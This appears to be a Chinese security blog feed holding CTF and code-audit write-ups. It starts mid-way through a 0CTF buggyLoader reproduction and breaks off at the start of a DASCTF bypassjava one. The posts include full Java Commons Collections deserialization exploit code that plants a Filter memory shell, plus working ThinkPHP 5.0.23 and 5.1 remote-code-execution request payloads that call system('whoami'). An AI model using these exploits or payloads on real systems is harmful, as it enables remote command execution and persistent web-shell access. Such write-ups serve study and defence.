题目复现</h2><p>用于打入内存马的CC链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CCExp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> <span class="title function_ invoke__">main</span>(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c = templates.<span class="title function_ invoke__">getClass</span>();</span><br><span class="line">        Field name = c.<span class="title function_ invoke__">getDeclaredField</span>(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        name.<span class="title function_ invoke__">set</span>(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        Field bytecodes = c.<span class="title function_ invoke__">getDeclaredField</span>(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        byte[] code = Files.<span class="title function_ invoke__">readAllBytes</span>(Paths.<span class="title function_ invoke__">get</span>(<span class="string">&quot;D://tmp/classes/FilterMenshell.class&quot;</span>));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.<span class="title function_ invoke__">set</span>(templates, codes);</span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazymap = LazyMap.<span class="title function_ invoke__">decorate</span>(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, templates);</span><br><span class="line">        map2.<span class="title function_ invoke__">put</span>(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.<span class="title function_ invoke__">remove</span>(templates);</span><br><span class="line">        Class cl = LazyMap.<span class="keyword">class</span>;</span><br><span class="line">        Field fieldfactory = cl.<span class="title function_ invoke__">getDeclaredField</span>(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        fieldfactory.<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        fieldfactory.<span class="title function_ invoke__">set</span>(lazymap, invokerTransformer);</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(map2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>加载的 Class 文件就是我们编写的 Filter 内存马</p><p>序列化写入二进制文件，利用python脚本base64编码。</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/14.png" class><p>将编码后的base串，写入path，注意格式，写出最终exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> <span class="title function_ invoke__">main</span>(String[] args) throws <span class="built_in">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">        RMIConnector rmiConnector = (RMIConnector) <span class="title function_ invoke__">getObject</span>();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.<span class="title function_ invoke__">decorate</span>(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, rmiConnector);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.<span class="title function_ invoke__">put</span>(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.<span class="title function_ invoke__">remove</span>(rmiConnector);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.<span class="keyword">class</span>;</span><br><span class="line">        Field factoryField = c.<span class="title function_ invoke__">getDeclaredField</span>(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        factoryField.<span class="title function_ invoke__">set</span>(lazyMap,invokerTransformer);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream  = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.<span class="title function_ invoke__">writeUTF</span>(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        objectOutputStream.<span class="title function_ invoke__">writeInt</span>(<span class="number">1896</span>);</span><br><span class="line">        objectOutputStream.<span class="title function_ invoke__">writeObject</span>(map2);</span><br><span class="line">        System.out.<span class="title function_ invoke__">println</span>(Utils.<span class="title function_ invoke__">bytesTohexString</span>(byteArrayOutputStream.<span class="title function_ invoke__">toByteArray</span>()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> Object <span class="title function_ invoke__">getObject</span>() throws <span class="built_in">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">        JMXServiceURL jmxServiceURL = <span class="keyword">new</span> <span class="title function_ invoke__">JMXServiceURL</span>(<span class="string">&quot;service:jmx:iiop:///stub/base串&quot;</span>);</span><br><span class="line">        RMIConnector rmiConnector = <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="keyword">return</span> rmiConnector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动服务</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/15.png" class><p>运行EXP，将payload打入 &#x2F;basic 路由，得用POST，get传不了这么多数据</p><p>看日志没有特殊报错，看来是写进去了</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/16.png" class><p>因为打入的是filter内存马，所以任何路由都能够执行命令，而我们执行命令的参数就是cmd</p><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/17.png" class><img src="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/18.png" class><p>执行命令成功。</p><h2 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h2><p>这道题质量还是挺好的，复现完这道题后，理解了loadClass无法加载数组类的真正原因，以及二次反序列化的应用思路。后续还会找一些不错的java题来复现。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 内存马 </tag>
            
            <tag> 二次反序列化 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp 5.1 rce流程分析</title>
      <link href="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
      <url>/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>继续分析 thinkphp 框架，本次分析的是 thinkphp 5.1版本的rce漏洞分析。</p><p>本篇文章也总结了两种POC，与thinkphp 5.0 也有部分联系。</p><h2 id="0x02-thinkphp-路由调度分析"><a href="#0x02-thinkphp-路由调度分析" class="headerlink" title="0x02 thinkphp 路由调度分析"></a>0x02 thinkphp 路由调度分析</h2><p>我们知道，thinkphp不是基于文件访问，而是基于路由。所以首先要弄清楚thinkphp是怎么实现路由调度的。</p><p>thinkphp规定了两种url访问模式，PATHINFO模式和兼容模式。</p><p>例如控制器中编写这样的一个方法</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/1.png" class><p>URL使用PATHINFO模式访问</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/2.png" class><p>1.就是控制器所在的模块名，think就是一个根命名空间</p><p>2.就是think类库下名为Index的控制器</p><p>3.4和5所对应的就是方法名，参数以及参数值。</p><p>再看看URL用兼容模式访问，其实都大同小异</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/3.png" class><p>就多了一个s参数，这个参数在上篇分析thinkphp5.0也遇到过，是config类中定义的默认参数。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>使用代码调试分析thinkphp的路由调度</p><p>在入口文件处下断点，开始调试</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/4.png" class><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/5.png" class><p>$dispatch默认为空，随即开始路由检测</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/6.png" class><p>获取url路径信息，继续跟进到pathinfo方法</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/7.png" class><p>我URL使用的是兼容模式，通过$GET全局变量获取到路径信息，随后return返回到APP.php文件</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/8.png" class><p>通过获取到的路径信息对路由进行检测</p><p>然后开始路由匹配，由于我们没有定义路由规则，所以会走到默认路由解析这里</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/9.png" class><p>开始解析url规则</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/10.png" class><p>其实就是对url进行分类，对应包名，控制器，方法，参数等等分别检测，然后返回解析好的url参数</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/11.png" class><p>接下来会实例化Module类，也是对这些参数进行格式化处理</p><p>回到APP类之后就开启了路由调度</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/12.png" class><p>跟进这个add方法，这个方法做了一个闭包函数当作参数传入，然后存入 queue 数组中</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/13.png" class><p>$middleware 就是一个封装着闭包函数的类，然后执行middleware类中的dispatch()方法</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/14.png" class><p>继续跟进 resolve 方法</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/15.png" class><p>这时候将闭包函数赋值给了$call属性，然后会继续回调函数，闭包函数注册为中间件，中间件的作用官方介绍说主要是用于拦截或过滤应用的HTTP请求，并进行必要的业务处理。所以可以推测这里是为了调用闭包函数中的run()方法，进行路由调度业务。返回APP类调用 $dispatch-&gt;run()</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/16.png" class><p>跟进exec方法后，根据url的参数创建控制器实例，通过控制器实例获取方法名，获取变量参数等等</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/17.png" class><p>然后会执行 invokeReflectMethod 方法进行函数调用，跟进之后发现已经调用到了控制器方法</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/18.png" class><p>然后将执行结果作为响应返回给客户端，最后一段不再继续跟了。</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><h3 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h3><p>首先我们需要找到能够函数调用，命令执行的危险函数，例如 call_user_func，或者call_user_func_array()等等</p><p>而在&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Container.php文件中就有 call_user_func_array 函数</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/19.png" class><p>这个文件不在我们的think模块内，我们能否像调用控制器方法那样</p><p>我们尝试按照上面写的url规则去访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaa/Container/invokefunction (这个类不是think模块里的，但是我们也不知道Container属于什么模块，所以就随便写)</span><br></pre></td></tr></table></figure><p>发起url请求看看报错</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/20.png" class><p>调试后执行流会走到这个报错，这里 $available 为false，我们需要其满足为true</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/21.png" class><p>在以上三种情况中 $available 可以赋值为true，在默认配置下，由于没有路由绑定，所以$bind为null，empty_module默认模块也没有定义，所以有机会实现的也只有第二个if分支了。</p><p>来分析一下这个if条件，需要满足两个条件</p><p>第一：$module 不能存在于 deny_module_list 这个黑名单中，跟进 getConfig 函数看一下</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/22.png" class><p>就一个common，目前是比较好满足的。</p><p>第二：module 于路径拼接后要是一个目录，跟进 getAppPath 函数看一下</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/23.png" class><p>大体意思就是application工作目录下是否存在 $module 目录，源码中该工作目录下只有index。所以目前来看，想要绕过报错也只能 $module 为index</p><p>继续往后看，当获取到类名，模块名，方法名后 就开始创造类的实例了</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/24.png" class><p>首先对其进行解析，构造命令空间，如果 $name 中有反斜杠会将其作为类的命名空间路径，通常情况下，我们需要进入到 parseClass 函数对模块与类名进行拼接，构造命名空间，而这种方法摆脱了模块的限制</p><p>例如我们需要调用的恶意类是 Container，它的命令空间为</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/25.png" class><p>该方法传递了两个参数</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/26.png" class><p>构造poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>可以成功执行命令</p><p>因为解析路由的时候是以 &#x2F; 解析路由，所以解析后的控制器是 think\container，在构造命令空间的时候</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/27.png" class><p>think就会被当作命名空间，container类就会成功实例化，随后就是获取方法名等操作。</p><p>这样的话我们就可以实例化或者调用任意类的public方法</p><h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><p>危险函数不止一处，在之前分析thinkphp 5.0.x 的rce漏洞分析中，在Request类中 filterValue 方法也存在 call_user_func 函数</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/28.png" class><p>这个类的命名空间也是 think，那么就可以任意函数调用了。但是调用的方法不能是 filterValue 方法。因为修饰属性不是public，所以需要往上一层找</p><p>最终找到input函数，追溯参数</p><img src="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/29.png" class><p>我们需要控制的就是data和filter参数，那么编写的poc就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/think\Request/input&amp;filter=system&amp;data=whoami</span><br></pre></td></tr></table></figure><p>也是可以成功执行命令的。</p><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h2><p>到此也算是对thinkphp有了初步的认识，在后续的时间里会开始对其他php框架做一个漏洞的代码审计分析。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp 5.0.23 RCE分析</title>
      <link href="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/"/>
      <url>/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>回头看thinkphp了，在开java代码审计之前锻炼一下php的审计能力，php和java都不能丢了。回想一下自己还没有怎么分析过框架，于是这次整了个thinkphp来分析，顺便也把phpstorm的调试配置也弄好了，也算是开始补坑了。</p><h2 id="0x02-thinkphp-RCE分析"><a href="#0x02-thinkphp-RCE分析" class="headerlink" title="0x02 thinkphp RCE分析"></a>0x02 thinkphp RCE分析</h2><p>本次复现参考Y4师傅的文章：<a href="https://blog.csdn.net/solitudi/article/details/113796433">https://blog.csdn.net/solitudi/article/details/113796433</a></p><p>thinkphp的开发框架就不说了，其实我也不太懂，RCE的分析会说的详细点，在此只记录这次分析过程中我对于thinkphp的认识。</p><p>主要有两个poc，其实都大同小异</p><h3 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?s=captcha</span><br><span class="line">POST</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure><p>贴个执行截图</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/1.png" class><p>还有类似验证码的图片，怎么来的</p><p>下断点调试，打入poc看看thinkphp内部的一个执行流程。</p><p>断点下在哪，thinkphp框架都有一个入口文件index.php，在public目录下，既然我们要在该文件下传数据，那么就在该文件下断点。</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/2.png" class><p>这里会调用 start.php 引导文件</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/3.png" class><p>执行app.php的run方法，app.php用于配置应用程序的全局设置和参数，我们跟进run方法，跟进之后会进入到Loader.php，</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/4.png" class><p>这里判断是否存在对应的类文件，是否是windows环境，然后就包含这个文件。</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/5.png" class><p>接下来进入到run方法，这里会创建一个Request类的实例，Request 就是处理请求的类，继续跟进</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/6.png" class><p>又需要 Loader 去包含，然后走到Request类的构造方法</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/7.png" class><p>这里将POST数据写入到input变量里，</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/8.png" class><p>创建完Request实例后，进入到 routeCheck 方法里</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/9.png" class><p>这里获取到path，跟进方法</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/10.png" class><p>这里做了一个判断，从Config类里获取到var_pathinfo的值，然后检查$_GET全局变量里是否存在这个变量，我们不妨跟进这个get方法去看一下</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/11.png" class><p>$range是_sys_，name属性的值就是var_pathinfo，对应config默认值就是s</p><p>那么所获取到的path就是captcha 然后走到路由检查这块地方</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/12.png" class><p>时刻关注与request有关的代码，因为可控的地方只有我们请求的数据</p><p>这里跟进到check方法</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/13.png" class><p>在857行这里，执行的request实例的 method 方法</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/14.png" class><p>这里，在config配置类中var_method的默认值就是</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/15.png" class><p>然后从$_POST全局变量中找键名为_method的值，这里存在任意函数调用，很关键，我们当前所传的值就是request类的构造方法，这里跟进</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/16.png" class><p>遍历键值对，然后判断键名在当前类中是否存在，若存在，就覆盖掉键值。</p><p>实际上该类的filter属性是没有空的，我们传的 filter[]&#x3D;system 会在此刻覆盖掉原有的值，参数值的覆盖同理，又是一个关键的一步。poc中method&#x3D;get 是将 method 的值给改回来，防止报错。</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/17.png" class><p>走到App类的exec方法，应该对应路由的调用，跟进</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/18.png" class><p>这里会走到这个分支，还像是captcha路由影响的，至于为什么，代码还没调出来，先留个坑。</p><p>然后跟进到 param 方法</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/19.png" class><p>$this-&gt;mergeParam 为true，进入不到 if 里面，那么进入到input方法</p><p>首先是对$name做一些格式 上的处理</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/20.png" class><p>然后判断$data是否为数组，满足条件就调用 filterValue 方法，此时的$data和$filter为</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/21.png" class><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/22.png" class><p>弹出filter数组的最后一个元素，然后遍历数组，call_user_func函数调用达到任意命令执行的目的。</p><h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><p>大同小异</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=captcha</span><br><span class="line">POST</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure><p>在 param 方法中</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/23.png" class><p>又有一处method方法的调用，不过参数设置为true了，跟进</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/24.png" class><p>调用了 server 方法，参数是 REQUEST_METHOD </p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/25.png" class><p>最后也会走到input，任意函数调用。</p><h3 id="补坑"><a href="#补坑" class="headerlink" title="补坑"></a>补坑</h3><p>来补坑了，写完这篇文章之后不甘心，打算又调一下代码，这次算是调明白了。</p><p>坑：为什么要get传一个 ?s&#x3D;captcha </p><p>结论：为了方便使 $dispatch&#x3D;method 从而进入 Request::instance()-&gt;param()，当时不懂，为什么传一个captcha 就能让$dispatch&#x3D;method？？？</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/26.png" class><p>就是在这里，所对应的$dispatch[‘type’]就是method</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/27.png" class><p>继续往上跟，看它是由什么赋值</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/28.png" class><p>在118行，调用routeCheck方法获取路由调度，这个方法返回的是 $result 那么继续看$result是由谁赋值</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/29.png" class><p>路由检查方法的返回值赋给 $result 调试跟的话实际上会走到这里</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/30.png" class><p>那么就需要看checkRoute函数的返回值了</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/31.png" class><p>此时遍历$rules的下标，有两个元素</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/32.png" class><p>拆分，解析路由相关参数</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/33.png" class><p>然后跟进到这个函数</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/34.png" class><p>在这个match函数里，将 $rule 的内容以斜杠分隔符拆分为数组，然后遍历，经过一系列的判断</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/35.png" class><p>这是一个关键点，这里判断<code>$val</code> 和 <code>$m1[$key]</code> 是否不相等，若不相等，返回非0，然后会 return false;所以在get传参上，一定要让s&#x3D;captcha，至于为什么是参数s，因为在config类中默认参数就是s了。</p><p>这里进入不了 elseif 就会遍历下一个元素，</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/36.png" class><p>成功匹配后就会调用到 parseRule函数来解析路由</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/37.png" class><p>最后就是让 $dispatch[‘type’]&#x3D;method了，回到了结论。</p><p>而如果我们get传入的不是 captcha，在match函数匹配规则的时候就会返回false，然后一路返回false</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/38.png" class><p>进入到这个if条件，然后调用 parseUrl 函数</p><img src="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/39.png" class><p>最后返回的 type 是module，在主要执行流中就走不到call_user_func函数了。</p><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h2><p>thinkphp没有对用户输入的方法名进行过滤和限制，导致可以任意函数调用，（此时的任意函数只是在Request类中）调用Request类的构造方法达到变量覆盖，最终call_user_func任意代码执行。</p><p>主要还是多调试才能理解poc的执行过程。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X CBCTF 2023  bypassjava 复现</title>
      <link href="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次比赛其他的不说，web题个人感觉质量还是挺高的（因为做不出来）赛题复现先从java题入手，bypassjava这道题涉及到的知识点挺多，复现下来能学到不少新东西。由于本题是边学边打边复现，所以文章篇幅可能比较长，所以单独写一篇文章来记录这道题的复现过程。</p><p>出题人WP：<a href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">官方WP</a>（真的很顶）</p><h2 id="题目附件分析"><a href="#题目附件分析" class="headerlink" title="题目附件分析"></a>题目附件分析</h2><p>给的源码，代码并不是很多</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/1.png" class><p>常规的反序列化点，只不过自己定义了一个Filter</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/2.png" class><p>限制了payload的长度，pom.xml里也没有特别明显能打的依赖</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/3.png" class><p>只有Springboot的依赖。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="jackson原生反序列化"><a href="#jackson原生反序列化" class="headerlink" title="jackson原生反序列化"></a>jackson原生反序列化</h3><p>看了出题人师傅的WP才知道可以打jackson原生的反序列化，也算是唤起了我一些记忆。之前复现的2023极客巅峰的babyurl题目就用到了jackson反序列化（链接：<a 